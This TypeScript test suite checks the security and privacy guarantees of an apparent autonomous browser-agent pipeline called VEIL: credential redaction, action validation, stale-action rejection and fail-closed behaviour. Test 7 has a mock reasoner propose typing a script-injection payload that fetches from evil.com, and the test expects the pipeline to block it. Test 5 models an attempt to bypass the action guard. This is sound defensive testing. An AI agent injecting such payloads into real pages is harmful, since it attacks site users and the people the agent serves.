/**
 * M01: End-to-End System Integration & Security Verification Test Suite (T015)
 * Author: AI010 (Browser Execution & Integration Engineer)
 *
 * Verifies the complete VEIL autonomous loop:
 * Browser -> Observation -> Perception -> Fusion -> Privacy -> Sanitization
 * -> Reasoning -> Action Validation -> Browser Execution -> Re-Observation -> Complete
 */

import { VeilOrchestrator } from '../orchestrator';
import { RawObservation, CDP } from '../../m02-observation/types';
import { ReasoningGateway } from '../../m09-reasoning/reasoningGateway';
import { ReasoningProvider, ReasoningRequest } from '../../m09-reasoning/types';
import { BrowserExecutor } from '../../m11-executor/browserExecutor';
import { CdpEventDispatcher } from '../../m11-executor/types';
import { SanitizedObservation } from '../../m08-sanitization/types';

export async function runT015Tests(): Promise<{ name: string; passed: boolean; error?: string }[]> {
  const results: { name: string; passed: boolean; error?: string }[] = [];

  function assert(condition: boolean, msg: string) {
    if (!condition) throw new Error(msg);
  }

  function assertEqual<T>(actual: T, expected: T, msg: string) {
    if (actual !== expected) {
      throw new Error(`${msg}: expected ${JSON.stringify(expected)}, got ${JSON.stringify(actual)}`);
    }
  }

  async function test(name: string, fn: () => Promise<void> | void) {
    try {
      await fn();
      results.push({ name, passed: true });
    } catch (err: any) {
      results.push({ name, passed: false, error: err.message || String(err) });
    }
  }

  class MockCdpDispatcher implements CdpEventDispatcher {
    public commands: Array<{ method: string; params?: Record<string, unknown> }> = [];
    async sendCommand<T = unknown>(method: string, params?: Record<string, unknown>): Promise<T> {
      this.commands.push({ method, params });
      return {} as T;
    }
  }

  function createMockRawObservation(id: string, options?: { username?: string; passwordValue?: string }): RawObservation {
    const username = options?.username ?? 'alice';
    const password = options?.passwordValue ?? 'secret_password_123';

    const domTree: CDP.DOM.Node = {
      nodeId: 1,
      nodeType: 1,
      nodeName: 'HTML',
      children: [
        {
          nodeId: 2,
          nodeType: 1,
          nodeName: 'BODY',
          children: [
            {
              nodeId: 3,
              backendNodeId: 101,
              nodeType: 1,
              nodeName: 'INPUT',
              attributes: ['type', 'text', 'placeholder', 'Username', 'value', username, 'role', 'textbox'],
            },
            {
              nodeId: 4,
              backendNodeId: 102,
              nodeType: 1,
              nodeName: 'INPUT',
              attributes: ['type', 'password', 'placeholder', 'Password', 'value', password, 'role', 'password'],
            },
            {
              nodeId: 5,
              backendNodeId: 103,
              nodeType: 1,
              nodeName: 'BUTTON',
              attributes: ['type', 'submit', 'role', 'button'],
              children: [{ nodeId: 6, nodeType: 3, nodeName: '#text', nodeValue: 'Confirm Booking' }],
            },
            {
              nodeId: 7,
              backendNodeId: 104,
              nodeType: 1,
              nodeName: 'DIV',
              attributes: ['role', 'banner'],
              children: [{ nodeId: 8, nodeType: 3, nodeName: '#text', nodeValue: 'Contact support: agent@airline.com' }],
            },
          ],
        },
      ],
    };

    const a11yTree: CDP.Accessibility.AXNode[] = [
      {
        nodeId: 'ax-1',
        ignored: false,
        backendDOMNodeId: 101,
        role: { type: 'role', value: 'textbox' },
        name: { type: 'name', value: 'Username' },
      },
      {
        nodeId: 'ax-2',
        ignored: false,
        backendDOMNodeId: 102,
        role: { type: 'role', value: 'password' },
        name: { type: 'name', value: 'Password' },
      },
      {
        nodeId: 'ax-3',
        ignored: false,
        backendDOMNodeId: 103,
        role: { type: 'role', value: 'button' },
        name: { type: 'name', value: 'Confirm Booking' },
      },
    ];

    return {
      observation_id: id,
      timestamp: Date.now(),
      screenshot: {
        format: 'png',
        data: 'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==',
        viewport: { width: 1280, height: 720, dpr: 1 },
      },
      dom_tree: domTree,
      a11y_tree: a11yTree,
    };
  }

  // 1. Full E2E Loop: Single action to completion (CLICK -> DONE)
  await test('1. Full E2E Loop: User goal "Click Confirm Booking" executes through entire pipeline', async () => {
    const mockCdp = new MockCdpDispatcher();
    const executor = new BrowserExecutor({ cdpDispatcher: mockCdp, clickDelayMs: 0 });

    let capturedSanitizedObs: any = null;
    let stepCount = 0;

    class ScriptedReasoner implements ReasoningProvider {
      public readonly providerId = 'scripted';
      async proposeAction(request: ReasoningRequest): Promise<unknown> {
        capturedSanitizedObs = request;
        stepCount++;

        if (stepCount === 1) {
          const submitNode = request.nodes.find((n) => n.text?.includes('Confirm Booking'));
          assert(!!submitNode, 'Confirm Booking node must be present in sanitized observation');

          return {
            action_id: 'act-scripted-click',
            observation_id: request.observation_id,
            action_type: 'CLICK',
            target_id: submitNode!.target_id,
            intended_effect: 'Click confirm booking',
          };
        } else {
          return {
            action_id: 'act-scripted-done',
            observation_id: request.observation_id,
            action_type: 'DONE',
            intended_effect: 'Task complete',
          };
        }
      }
    }

    const gateway = new ReasoningGateway({ provider: new ScriptedReasoner() });
    const orchestrator = new VeilOrchestrator();

    const result = await orchestrator.run('Click Confirm Booking', {
      maxSteps: 2,
      reasoningGateway: gateway,
      browserExecutor: executor,
      observationProvider: async () => createMockRawObservation('obs-e2e-1'),
    });

    if (!result.success) {
      throw new Error(`Orchestrator failed in test 1: ${result.errorMessage}`);
    }
    assertEqual(result.stepsExecuted, 2, 'Executed 2 steps to completion');
    assertEqual(result.history[0].validatedAction.action_type, 'CLICK', 'Action type is CLICK');
    assertEqual(result.history[0].executionResult.status, 'SUCCESS', 'Execution result status SUCCESS');
    assertEqual(result.history[1].validatedAction.action_type, 'DONE', 'Final action is DONE');
    assert(mockCdp.commands.length >= 3, 'CDP commands were sent to browser');

    // Verify privacy boundary on captured observation
    assert(!!capturedSanitizedObs, 'Sanitized observation reached reasoner');
    const sensitiveBanner = capturedSanitizedObs.nodes.find((n: any) => n.text?.includes('agent@airline.com'));
    assert(!sensitiveBanner, 'Email agent@airline.com must NOT appear in raw text');
    const redactedEmailNode = capturedSanitizedObs.nodes.find((n: any) => n.text?.includes('[REDACTED:EMAIL]'));
    assert(!!redactedEmailNode, 'Sensitive email must be sanitized to [REDACTED:EMAIL]');
  });

  // 2. Multi-step Re-Observation Loop with state mutation and completion (TYPE -> CLICK -> DONE)
  await test('2. Multi-step Re-Observation Loop: Type username -> Click Submit -> DONE with new observation IDs', async () => {
    const mockCdp = new MockCdpDispatcher();
    const executor = new BrowserExecutor({ cdpDispatcher: mockCdp, clickDelayMs: 0 });

    let currentStep = 0;
    const observationIdsSeen: string[] = [];

    class MultiStepReasoner implements ReasoningProvider {
      public readonly providerId = 'multistep';
      async proposeAction(request: ReasoningRequest): Promise<unknown> {
        observationIdsSeen.push(request.observation_id);
        currentStep++;

        if (currentStep === 1) {
          const inputNode = request.nodes.find((n) => n.role === 'textbox');
          return {
            action_id: 'act-step-1',
            observation_id: request.observation_id,
            action_type: 'TYPE',
            target_id: inputNode!.target_id,
            parameters: { text: 'charlie' },
            intended_effect: 'Type charlie',
          };
        } else if (currentStep === 2) {
          const btnNode = request.nodes.find((n) => n.role === 'button');
          return {
            action_id: 'act-step-2',
            observation_id: request.observation_id,
            action_type: 'CLICK',
            target_id: btnNode!.target_id,
            intended_effect: 'Click submit',
          };
        } else {
          return {
            action_id: 'act-step-3',
            observation_id: request.observation_id,
            action_type: 'DONE',
            intended_effect: 'Task complete',
          };
        }
      }
    }

    const gateway = new ReasoningGateway({ provider: new MultiStepReasoner() });
    const orchestrator = new VeilOrchestrator();

    let obsCounter = 0;
    const result = await orchestrator.run('Login and submit', {
      maxSteps: 5,
      reasoningGateway: gateway,
      browserExecutor: executor,
      observationProvider: async () => {
        obsCounter++;
        return createMockRawObservation(`obs-multistep-${obsCounter}`);
      },
    });

    assertEqual(result.success, true, 'Multi-step task succeeded');
    assertEqual(result.finalState, 'COMPLETED', 'Final state is COMPLETED');
    assertEqual(result.stepsExecuted, 3, 'Executed 3 steps to completion');

    // Verify Re-Observation Invariant: Each step MUST have a unique observation_id!
    assertEqual(observationIdsSeen.length, 3, '3 observations were generated');
    assertEqual(observationIdsSeen[0], 'obs-multistep-1', 'Step 1 used observation 1');
    assertEqual(observationIdsSeen[1], 'obs-multistep-2', 'Step 2 used observation 2');
    assertEqual(observationIdsSeen[2], 'obs-multistep-3', 'Step 3 used observation 3');
    assert(observationIdsSeen[0] !== observationIdsSeen[1], 'Step 2 generated a fresh observation_id');
    assert(observationIdsSeen[1] !== observationIdsSeen[2], 'Step 3 generated a fresh observation_id');
  });

  // 3. Privacy Invariant: Sensitive raw credentials never cross reasoning boundary
  await test('3. Privacy Invariant: Raw password value NEVER crosses reasoning gateway boundary', async () => {
    let capturedSanitizedObs: any = null;

    class PrivacyAuditReasoner implements ReasoningProvider {
      public readonly providerId = 'privacy-audit';
      async proposeAction(request: ReasoningRequest): Promise<unknown> {
        capturedSanitizedObs = request;
        return {
          action_id: 'act-audit',
          observation_id: request.observation_id,
          action_type: 'DONE',
          intended_effect: 'Done',
        };
      }
    }

    const gateway = new ReasoningGateway({ provider: new PrivacyAuditReasoner() });
    const orchestrator = new VeilOrchestrator();

    await orchestrator.run('Audit privacy', {
      maxSteps: 1,
      reasoningGateway: gateway,
      observationProvider: async () =>
        createMockRawObservation('obs-priv-audit', {
          passwordValue: 'super_confidential_pw_999!',
        }),
    });

    assert(!!capturedSanitizedObs, 'Sanitized observation reached reasoner');
    const payloadString = JSON.stringify(capturedSanitizedObs);
    assert(!payloadString.includes('super_confidential_pw_999!'), 'Raw password NEVER appears in reasoning payload');

    const passwordNode = capturedSanitizedObs.nodes.find((n: any) => n.role === 'password');
    assert(!!passwordNode, 'Password node present');
    assertEqual(passwordNode.text, '[REDACTED:PASSWORD]', 'Password text replaced with [REDACTED:PASSWORD]');
  });

  // 4. Privacy Invariant: Raw DOM tree, A11y tree, and raw screenshot never reach reasoner
  await test('4. Privacy Invariant: Raw DOM tree, A11y tree, and raw OCR evidence never reach reasoner', async () => {
    let capturedSanitizedObs: any = null;

    class StructuralAuditReasoner implements ReasoningProvider {
      public readonly providerId = 'structural-audit';
      async proposeAction(request: ReasoningRequest): Promise<unknown> {
        capturedSanitizedObs = request;
        return {
          action_id: 'act-done',
          observation_id: request.observation_id,
          action_type: 'DONE',
          intended_effect: 'Done',
        };
      }
    }

    const gateway = new ReasoningGateway({ provider: new StructuralAuditReasoner() });
    const orchestrator = new VeilOrchestrator();

    await orchestrator.run('Check raw leak', {
      maxSteps: 1,
      reasoningGateway: gateway,
      observationProvider: async () => createMockRawObservation('obs-structural-leak-check'),
    });

    assert(capturedSanitizedObs.dom_tree === undefined, 'dom_tree must NOT exist in reasoner observation');
    assert(capturedSanitizedObs.a11y_tree === undefined, 'a11y_tree must NOT exist in reasoner observation');
    assert(capturedSanitizedObs.raw_ocr === undefined, 'raw_ocr must NOT exist in reasoner observation');
  });

  // 5. Action Authority Invariant: T012 cannot directly execute browser actions
  await test('5. Action Authority: T014 rejects raw ActionProposal directly from T012 without T013 validation', async () => {
    const mockCdp = new MockCdpDispatcher();
    const executor = new BrowserExecutor({ cdpDispatcher: mockCdp });

    const rawProposal = {
      action_id: 'act-bypass-guard',
      observation_id: 'obs-1',
      action_type: 'CLICK',
      target_id: 'btn-target',
      intended_effect: 'Bypass T013 Action Guard',
    };

    const res = await executor.execute(rawProposal);
    assertEqual(res.status, 'REJECTED', 'Executor rejected raw ActionProposal');
    assertEqual(mockCdp.commands.length, 0, 'Zero browser commands dispatched');
  });

  // 6. Stale Action Protection: Stale observation ID fails closed
  await test('6. Stale Action Protection: ActionProposal bound to previous observation_id is rejected', async () => {
    class StaleReplayReasoner implements ReasoningProvider {
      public readonly providerId = 'stale-replay';
      async proposeAction(_request: ReasoningRequest): Promise<unknown> {
        return {
          action_id: 'act-stale-replay',
          observation_id: 'obs-OLD-OUTDATED', // Mismatched observation_id
          action_type: 'CLICK',
          target_id: 'btn-1',
          intended_effect: 'Execute against old state',
        };
      }
    }

    const gateway = new ReasoningGateway({ provider: new StaleReplayReasoner() });
    const orchestrator = new VeilOrchestrator();

    const result = await orchestrator.run('Stale test', {
      maxSteps: 1,
      reasoningGateway: gateway,
      observationProvider: async () => createMockRawObservation('obs-FRESH-1'),
    });

    assertEqual(result.success, false, 'Stale replay must fail');
    assertEqual(result.finalState, 'ABORTED', 'Final state is ABORTED');
    assert(
      result.errorMessage?.includes('OBSERVATION_ID_MISMATCH') ||
        result.errorMessage?.includes('OBSERVATION_BINDING_MISMATCH') ||
        false,
      'Fails with observation ID mismatch'
    );
  });

  // 7. Security Invariant: Prompt injection / Script injection in parameters is rejected
  await test('7. Security Invariant: Script injection attempt in reasoning parameters is rejected fail-closed', async () => {
    class ScriptInjectionReasoner implements ReasoningProvider {
      public readonly providerId = 'script-injection';
      async proposeAction(request: ReasoningRequest): Promise<unknown> {
        const inputNode = request.nodes.find((n) => n.role === 'textbox');
        return {
          action_id: 'act-xss-attempt',
          observation_id: request.observation_id,
          action_type: 'TYPE',
          target_id: inputNode!.target_id,
          parameters: { text: '<script>fetch("http://evil.com")</script>' },
          intended_effect: 'Execute script injection',
        };
      }
    }

    const gateway = new ReasoningGateway({ provider: new ScriptInjectionReasoner() });
    const orchestrator = new VeilOrchestrator();

    const result = await orchestrator.run('Injection test', {
      maxSteps: 1,
      reasoningGateway: gateway,
      observationProvider: async () => createMockRawObservation('obs-inject-1'),
    });

    assertEqual(result.success, false, 'Script injection proposal rejected');
    assertEqual(result.finalState, 'ABORTED', 'State is ABORTED');
    assert(
      result.errorMessage?.includes('SCRIPT_INJECTION_DETECTED') ||
        result.errorMessage?.includes('MALFORMED_MODEL_RESPONSE') ||
        result.errorMessage?.includes('prohibited executable script payload') ||
        result.errorMessage?.includes('INVALID_ACTION_PROPOSAL') ||
        false,
      'Script injection caught'
    );
  });

  // 8. Fail-Closed: Browser execution failure does not trigger unsafe fallback
  await test('8. Fail-Closed: CDP execution failure halts pipeline safely without unsafe fallback', async () => {
    const mockCdp = new MockCdpDispatcher();
    mockCdp.sendCommand = async () => {
      throw new Error('CDP target tab crashed');
    };
    const executor = new BrowserExecutor({ cdpDispatcher: mockCdp });

    class NormalReasoner implements ReasoningProvider {
      public readonly providerId = 'normal';
      async proposeAction(request: ReasoningRequest): Promise<unknown> {
        const btnNode = request.nodes.find((n) => n.role === 'button');
        return {
          action_id: 'act-click-fail',
          observation_id: request.observation_id,
          action_type: 'CLICK',
          target_id: btnNode!.target_id,
          intended_effect: 'Click',
        };
      }
    }

    const gateway = new ReasoningGateway({ provider: new NormalReasoner() });
    const orchestrator = new VeilOrchestrator();

    const result = await orchestrator.run('Crash test', {
      maxSteps: 1,
      reasoningGateway: gateway,
      browserExecutor: executor,
      observationProvider: async () => createMockRawObservation('obs-crash-1'),
    });

    assertEqual(result.success, false, 'Crashed CDP run reported as failure');
    assert(result.errorMessage?.includes('Execution failed') || false, 'Error message captures failure');
  });

  return results;
}
